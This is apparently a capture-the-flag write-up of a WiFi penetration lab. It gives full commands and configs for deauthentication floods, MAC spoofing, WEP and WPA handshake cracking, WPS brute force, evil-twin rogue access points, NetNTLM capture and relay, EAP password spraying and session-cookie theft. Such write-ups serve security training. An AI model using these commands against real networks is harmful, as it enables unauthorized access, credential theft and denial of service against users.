# Recon

## 01. List all client MACs
> List all client MACs and get the MAC of the wifi-global client. FLAG: the wifi-global client MAC

### Solution :
Set wlan to monitor mode
```
sudo airmon-ng start wlan0
```
or
```
sudo ip link set wlan0 down
sudo iw wlan0 set monitor control
sudo ip link set wlan0 up
```

After that, we can execute airodump-ng to capture all traffic and list APs and clients

```
airodump-ng wlan0mon -w scan --manufacturer --wps --band abg
```

- `-w` -> to save the output to scan file.
- `--manufacturer` -> Display manufacturer from IEEE OUI list.
- `--wps` -> Display WPS information (if any).
- `--band abg` -> to scan 2.4Ghz and 5Ghz.

As we can see the AP wifi-global is in channel 44, so we can exec airodump only in this channel.

```
airodump-ng wlan0mon -w scan --manufacturer --wps -c44
```

We can use TAB, to "enabled AP selection" and choose and AP.

We can search in two channels using:
```
airodump-ng wlan0mon -w scan --manufacturer --wps -c1,44
```
We can use wifi_db to get this information processing the airodump-ng captures.



## 02. Detect APs information
> Detect APs information FLAG: wifi-corp channel

### Solution :

Using the last challenge airodump-ng we can see the wifi-corp channel
And using `wifi_db`.

## 03. Get probes from users
> Get the probes of client with MAC: 78:C1:A7:BF:72:66

### Solution :
If we use wifi_db we can open the probe table and get the ESSID.

Or we can use the airodump-ng capture.

## 04. Find hidden network ESSID
> Find hidden network ESSID (mac F0:9F:C2:71:22:11).

### Solution :
If there are client, we can wait to a client connection to get de ESSID, but if there isn't we can brute force probes to get the name with mdk4.

We performed a ESSID brute force attack with rockyou
```
airmon-ng start wlan0
iwconfig wlan0mon channel 1
mdk4 wlan0mon p -t F0:9F:C2:71:22:11 -f ~/rockyou.txt
```


# OPN

## 05. Access to wifi-guest network
> Access to wifi-guest network. After connecting, what is the bypassed security mechanism to connect called? (With space and English)

### Solution :
To connect to an OPEN wifi using wpa_supplicant we have to create the following open.conf file.
```
network={
        ssid="wifi-guest"
        key_mgmt=NONE
}
```
And execute it using:
```
wpa_supplicant -Dnl80211 -iwlan2 -c open.conf
```

The APs is rejecting the connection, so the AP has a MAC whitelist to connect. This is not common, but many Captive Portals use the MAC to gran access to internet. So is the same principle.

To connect we have to get a valid MAC and change ours. As we see before the AP has 3 clients:

To change MAC:
```
systemctl stop network-manager
ip link set wlan2 down
macchanger -m <CLIENT MAC> wlan2
ip link set wlan2 up
```

Now, we are connected, and we have IP using "dhclient".

```
dhclient
```

so, the bypassed security mechanism is "Mac filtering"

## 06. Login to the server with user’s password
> Login to the server with user’s password. To do this, obtain the credentials of one of the free users and access the router. Write the FLAG.

### Solution :
We can find several HTTP POST messages with a user and a pass from the IP range 192.168.0.0/24 to the IP 192.168.0.1.

We can use pcapFilter instead of Wireshark.

and now we can login to the Router and get the FLAG.


# WEP

## 07. Get hidden wifi password
> Get hidden wifi password. FLAG: Pass in hex

### Solution
we can use besside-ng to do the attack.
```
airmon-ng check kill
besside-ng -c 1 -b F0:9F:C2:71:22:11 wlan1 -v
```
Since the network is hidden, it is necessary to perform a probe with the correct ESSID for the attack to work, so while besside-ng is running we execute mdk4 in another window.
```
airmon-ng start wlan0
iwconfig wlan0mon channel 1
mdk4 wlan0mon p -t F0:9F:C2:71:22:11 -f ~/rockyou.txt
```

# PSK

## 08. Get wifi-mobile password
> Get wifi-mobile password

### Solution :
We verify that there are connected clients with:
```
airodump-ng wlan0mon -w wifi -c 1 --wps
```
We perform a denial of service against all AP users
```
aireplay-ng -0 0 -a F0:9F:C2:71:22:22 wlan0mon
```
Stop the aireplay-ng and now we have a handshake

In case it doesn't work we can use:

```
aireplay-ng -0 0 -a F0:9F:C2:71:22:22 -c 28:6C:07:6F:F9:33 wlan0mon
```
Once one of the clients connects to the network, we get the handshake.

This handshake can be cracked quickly with aircrack-ng or with hashcat in the case of wanting to use GPU and complex rules.
```
aircrack-ng wifi-01.cap -w ~/rockyou.txt
```

Using wifi_db
```
echo 'WPA*02*17b22439b2693981b0b55 ... 00fac020000*02' > hashcat.hash
```
```
hashcat -a 0 -m 22000 hashcat.hash ~/rockyou.txt
```


## 09. Get users traffic passively
> Get wifi-mobile users traffic passively and get client subnet FLAG Example: 10.1.2.0/24

Solution
To decrypt the traffic, we need to have obtained the user handshake and have the password. For this we use airdecap-ng.

```
airdecap-ng -e wifi-mobile -p <PASSWORD> /home/user/test-06.cap
```

This generates a cap with the traffic as if it were an Open network, so we can obtain the passwords or cookies of the users and the private IPs: 192.168.2.0/24.


## 10. Verify Client isolation
> Verify Client isolation in AP wifi-mobile. Get flag from the other user's web server.

Solution
Configure psk.conf to connect to the AP
```
network={
    ssid="wifi-mobile"
    psk="<PASSWORD>"
    scan_ssid=1
    key_mgmt=WPA-PSK
    proto=WPA2
}
```
Connect and get IP.

```
wpa_supplicant -Dnl80211 -iwlan3 -c psk.conf &
dhclient wlan3 -v
```
Find other clients in the same network.

```
arp-scan -l -I wlan3
```
Access the web server using curl.

```
curl 192.168.2.19
```
## 11. Login with stolen cookies
> Get wifi-mobile users traffic passively (802.11), decrypt and login with stolen cookies to wifi-mobile's AP router to get user FLAG.

### Solution :
Using the decrypted traffic from the Challenge 09 we can find the HTTP request using cookies PHPSESSID.

Using Firefox, we can set manually de PHPSESSID and reload to access the authenticated part.

## 12. Get wifi-office AP Password
> Get wifi-office AP Password

### Solution :
We can verify that there are two clients not connected to any network sending probes for wifi-office

To obtain the handshake of this network we can raise an AP with the same name and the same network configuration. This can be achieved by obtaining the first 2 phases of the handshake. In the next code block you can see the hostapd file and the obtaining of the handshake using hostapd-mana. hostapd.conf
```
interface=wlan1
driver=nl80211
hw_mode=g
channel=1
ssid=wifi-office
mana_wpaout=hostapd.hccapx
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_passphrase=12345678
```
```
hostapd-mana hostapd.conf
```
Now we can brute force the captured handshake.
```
hashcat -a 0 -m 2500 hostapd.hccapx ~/rockyou.txt --force
```
In case the 2500 mode does not work you can convert the hash from 2500 to 22000:

Save the hccapx to pcap
```
hcxhash2cap --hccapx=hostapd.hccapx -c aux.pcap
```
Export the 22000 hash mode from the pcap

```
hcxpcapngtool aux.pcap -o hash.22000
```
Crack outside the VM or with a new version of hashcat.

```
sudo hashcat -a 0 -m 22000 hash.22000 ~/rockyou.txt --force
```
## 13. Get wifi-admin AP password
> Get wifi-admin AP password

### Solution :
We can check if any network uses WPS with the flag --wps.


As we can see, the AP uses WPS, so we can try different attacks to get the password.

The simplest attack to perform is a brute force with PIN, for this we use reaver.

```
reaver -i wlan0mon -b F0:9F:C2:71:22:33
```

Another option could be to use Pixie Dust attack, but in this case is not vulnerable.


# MGT

## 14. Get users login IDs (usernames)
> Get users login IDs (usernames) from wifi-corp clients. FLAG: DOMAIN

### Solution :
If clients do not use anonymous identities, it is possible to obtain this information passively through the WiFi. For this we can use Wireshark looking for the responses of the clients to the EAP Identity requests.

Or use wifi_db


## 15. Get cert information
> Get wifi-corp cert information. FLAG: CA email address

### Solution :
We can use pcapFilter.sh to display the certificates used by APs with MGT.

```
bash pcapFilter.sh -f /home/user/wifi/wifi-04.cap -C 
```

## 16. Get EAP methods supported by AP
Get EAP methods supported by AP FLAG: Only method supported by wifi-corp and wifi-global

### Solution :
To check the EAP methods that an AP supports, try to access with a valid user using each of the configurations. For this we can use EAP_buster.

```
cd /root/tools/EAP_buster/
bash ./EAP_buster.sh wifi-corp 'CONTOSOLAB\juan.tr' wlan0mon
bash ./EAP_buster.sh wifi-global 'GLOBAL\GlobalAdmin' wlan0mon
```


# wifi-global


## 17. Get Juan user password of wifi-corp
Get Juan's password (wifi-corp)

### Solution
We can use eaphammer to attack MGT clients.

```
cd /root/tools/eaphammer
python3 ./eaphammer --cert-wizard
python3 ./eaphammer -i wlan3 --auth wpa-eap --essid wifi-corp --creds --negotiate balanced
```

Alternative, you can use hostapd_wpe

```
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
```
After starting the RogueAP we disconnect the client

```
aireplay-ng -0 0 -a F0:9F:C2:71:22:55 wlan0mon -c 10:f9:6f:07:6c:00
```
Carrying out the attack we can obtain the NETNTLM hash of the user to crack it later or carry out a relay attack.


Once we have the hash we can brute force it with hashcat

```
hashcat -a 0 -m 5500 juan.tr::::...:1be06d07bcdd5a69 ~/rockyou.txt --force
```

## 18. Brute force user test
> Brute force user CONTOSOLAB\test

### Solution :
We can brute force the user using air-hammer
```
cd  ~/tools/air-hammer
echo 'CONTOSOLAB\test' > test.user
./air-hammer.py -i wlan3 -e wifi-corp -p ~/rockyou.txt -u test.user 
```

## 19. Login with user with password 12345678
> Login with user with password 12345678 (is in top-usernames-shortlist.txt). FLAG: Username

### Solution
This challenge it's similar to the last one, so we can use the same tool or eaphammer (eaphammer is faster). But first we have to modify the list inserting the DOMAIN.

```
cat ~/top-usernames-shortlist.txt | awk '{print "CONTOSOLAB\\" $1}' > ~/top-usernames-shortlist-contoso.txt
```

Then we can start the brute force.

```
./air-hammer.py -i wlan3 -e wifi-corp -P 12345678 -u ~/top-usernames-shortlist-contoso.txt
```
or
```
python3 ./eaphammer --eap-spray \
    --interface-pool wlan1 wlan2 wlan3 \
    --essid wifi-corp \
    --password 12345678 \
    --user-list ~/top-usernames-shortlist-contoso.txt
```
## 20. Connect to the network with Luis user without cracking their password
> Connect to the network wifi-regional with the Luis's account without cracking his password (it's impossible to crack). Then access Router and get the FLAG

### Solution
In the case of having the NetNTLM hash of the user but not being able to crack it, a Creds Relay attack can be carried out using sycophant.

For this we create the file ~/tools/wpa_sycophant/wpa_sycophant_example.conf:
```
network={
  ssid="wifi-regional"
  # The SSID you would like to relay and authenticate against. 
  scan_ssid=1
  key_mgmt=WPA-EAP
  # Do not modify
  identity=""
  anonymous_identity=""
  password=""
  # This initialises the variables for me.
  # -------------
  eap=PEAP
  phase1="crypto_binding=0 peaplabel=0"
  phase2="auth=MSCHAPV2"
  # Dont want to connect back to ourselves,
  # so add your rogue BSSID here.
  bssid_blacklist=02:00:00:00:01:00
}
```
And we execute the following command in different shells.

#Shell 1
```
cd ~/tools/berate_ap/
airmon-ng start wlan1
./berate_ap --eap --mana-wpe --wpa-sycophant --mana-credout outputMana.log  wlan1mon ens33 wifi-regional
```
#Shell 2
```
airmon-ng start wlan0
aireplay-ng -0 0 wlan0mon -a F0:9F:C2:71:22:66 -c 10:F9:6F:AC:53:10 
```
#Shell 3
```
cd ~/tools/wpa_sycophant/
airmon-ng start wlan3
./wpa_sycophant.sh -c wpa_sycophant_example.conf -i wlan3mon
```
#Shell 4
```
dhclient wlan3mon -v
```

### 21. Get CA from the Router using default creds
> Get CA from the Router using default creds FLAG: CA web folder name

### Solution
The folder name is in the last capture, int he URL http://192.168.6.1/index.php. Download and rename the files.
```
cat server.key.txt.a server.key.txt.b > server.key
cat ca.key.txt.a ca.key.txt.b > ca.key
mv ca.serial.txt ca.serial
mv ca.crt.txt ca.crt
mv dh.txt dh
mv server.crt.txt server.crt
```
### 22. Get wifi-corp Administrator password using the CA
> Get the other wifi-corp USER (Administrator) password using the CA

### Solution
Once the CA and the AP certificate have been downloaded, we can impersonate the AP so that the client that verified the certificate can connect. To this we import the certificate to eaphammer.
```
cd /root/tools/eaphammer
python3 ./eaphammer --cert-wizard import --server-cert /home/user/Downloads/server.crt --ca-cert /home/user/Downloads/ca.crt --private-key /home/user/Downloads/server.key --private-key-passwd whatever

python3 ./eaphammer -i wlan3 --auth wpa-eap --essid wifi-corp --creds --negotiate balanced
aireplay-ng -0 0 -a F0:9F:C2:71:22:55 wlan0mon -c 10:F9:6F:BA:6C:11
```
### 23. Login to wifi-global Administrator web creds
> Once we have the certificate, we can create a client certificate using: https://wiki.innovaphone.com/index.php?title=Howto:802.1X_EAP-TLS_With_FreeRadius

Download the client certificate and connect to wifi-global with user GlobalAdmin to get FLAG from HTTP server

### Solution
If we have the client certificate we only have to use it to connect. We create a wpa_tls.conf file.

```
eapol_version=1
ap_scan=1
fast_reauth=1
```
```
network={
    ssid="wifi-global"
    scan_ssid=0
    mode=0
    proto=RSN
    key_mgmt=WPA-EAP
    auth_alg=OPEN
    eap=TLS
    identity="GLOBAL\GlobalAdmin"
    ca_cert="./ca.crt"
    client_cert="./client.crt"
    private_key="./client.key"
    private_key_passwd="whatever" 
}
```
```
wpa_supplicant -Dnl80211 -i wlan2 -c wpa_tls.conf
```
And thats all, now we are conneted to the last AP.
